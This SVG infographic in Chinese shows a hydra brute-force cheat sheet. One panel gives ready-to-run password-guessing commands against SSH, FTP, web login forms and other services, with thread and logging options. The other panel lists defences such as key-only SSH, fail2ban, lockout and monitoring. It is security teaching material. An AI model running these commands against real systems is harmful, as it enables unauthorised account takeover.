<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 480" width="100%" font-family="PingFang SC, Microsoft YaHei, sans-serif">
  <rect width="1000" height="480" fill="#f8fafc"/>
  <text x="500" y="30" font-size="16" font-weight="bold" text-anchor="middle" fill="#1a202c">弱口令爆破：hydra 协议支持矩阵</text>

  <rect x="40" y="60" width="180" height="60" rx="8" fill="#fed7d7" stroke="#c53030" stroke-width="2"/>
  <text x="130" y="85" font-size="10" text-anchor="middle" fill="#c53030" font-weight="bold">SSH</text>
  <text x="130" y="105" font-size="9" text-anchor="middle" fill="#c53030">hydra ssh://target</text>

  <rect x="240" y="60" width="180" height="60" rx="8" fill="#fefcbf" stroke="#b7791f" stroke-width="2"/>
  <text x="330" y="85" font-size="10" text-anchor="middle" fill="#b7791f" font-weight="bold">FTP</text>
  <text x="330" y="105" font-size="9" text-anchor="middle" fill="#b7791f">hydra ftp://target</text>

  <rect x="440" y="60" width="180" height="60" rx="8" fill="#e9d8fd" stroke="#805ad5" stroke-width="2"/>
  <text x="530" y="85" font-size="10" text-anchor="middle" fill="#805ad5" font-weight="bold">HTTP-POST</text>
  <text x="530" y="105" font-size="9" text-anchor="middle" fill="#805ad5">hydra http-post-form</text>

  <rect x="640" y="60" width="180" height="60" rx="8" fill="#c6f6d5" stroke="#38a169" stroke-width="2"/>
  <text x="730" y="85" font-size="10" text-anchor="middle" fill="#38a169" font-weight="bold">RDP</text>
  <text x="730" y="105" font-size="9" text-anchor="middle" fill="#38a169">hydra rdp://target</text>

  <rect x="840" y="60" width="120" height="60" rx="8" fill="#bee3f8" stroke="#3182ce" stroke-width="2"/>
  <text x="900" y="85" font-size="10" text-anchor="middle" fill="#3182ce" font-weight="bold">SMTP</text>
  <text x="900" y="105" font-size="9" text-anchor="middle" fill="#3182ce">hydra smtp://target</text>

  <rect x="40" y="140" width="460" height="310" rx="12" fill="#fff5f5" stroke="#e53e3e" stroke-width="2"/>
  <text x="270" y="165" font-size="12" font-weight="bold" text-anchor="middle" fill="#822727">hydra 实战命令</text>

  <text x="70" y="195" font-size="10" font-weight="bold" fill="#c53030">SSH 爆破：</text>
  <text x="70" y="215" font-size="9" fill="#2d3748">hydra -l root -P rockyou.txt ssh://192.168.1.100</text>

  <text x="70" y="240" font-size="10" font-weight="bold" fill="#805ad5">FTP 爆破：</text>
  <text x="70" y="260" font-size="9" fill="#2d3748">hydra -l ftpuser -P pass.txt ftp://192.168.1.100</text>

  <text x="70" y="285" font-size="10" font-weight="bold" fill="#dd6b20">HTTP POST：</text>
  <text x="70" y="305" font-size="9" fill="#2d3748">hydra -l admin -P pass.txt http-post-form</text>
  <text x="70" y="325" font-size="9" fill="#2d3748">"http://target/login.php:user=^USER^&pass=^PASS^:F=login failed"</text>

  <text x="70" y="350" font-size="10" font-weight="bold" fill="#3182ce">多线程：</text>
  <text x="70" y="370" font-size="9" fill="#2d3748">hydra -l admin -P pass.txt ssh://target -t 64</text>

  <text x="70" y="395" font-size="10" font-weight="bold" fill="#38a169">防断连：</text>
  <text x="70" y="415" font-size="9" fill="#2d3748">hydra -l admin -P pass.txt ssh://target -w 30</text>
  <text x="70" y="435" font-size="9" fill="#2d3748">-w: 等待时间（秒）</text>

  <text x="70" y="460" font-size="10" font-weight="bold" fill="#276749">输出：</text>
  <text x="70" y="475" font-size="9" fill="#2d3748">hydra -l admin -P pass.txt ssh://target -o result.log</text>

  <rect x="520" y="140" width="440" height="310" rx="12" fill="#f0fff4" stroke="#48bb78" stroke-width="2"/>
  <text x="740" y="165" font-size="12" font-weight="bold" text-anchor="middle" fill="#276749">防御加固</text>

  <text x="550" y="195" font-size="10" font-weight="bold" fill="#c53030">SSH 加固：</text>
  <text x="550" y="215" font-size="9" fill="#2d3748">关闭密码登录 · 仅密钥</text>
  <text x="550" y="235" font-size="9" fill="#2d3748">fail2ban · denyhosts</text>
  <text x="550" y="255" font-size="9" fill="#2d3748">限制登录 IP 白名单</text>

  <text x="550" y="285" font-size="10" font-weight="bold" fill="#805ad5">Web 加固：</text>
  <text x="550" y="305" font-size="9" fill="#2d3748">验证码 · 登录频率限制</text>
  <text x="550" y="325" font-size="9" fill="#2d3748">账户锁定策略（5次失败锁15分钟）</text>

  <text x="550" y="355" font-size="10" font-weight="bold" fill="#dd6b20">密码策略：</text>
  <text x="550" y="375" font-size="9" fill="#2d3748">最低 8 位 · 大小写+数字+特殊字符</text>
  <text x="550" y="395" font-size="9" fill="#2d3748">定期更换 · 禁止弱口令</text>

  <text x="550" y="425" font-size="10" font-weight="bold" fill="#3182ce">监控：</text>
  <text x="550" y="445" font-size="9" fill="#2d3748">审计登录日志 · 异常登录告警</text>
  <text x="550" y="465" font-size="9" fill="#2d3748">SIEM 集中分析</text>
</svg>
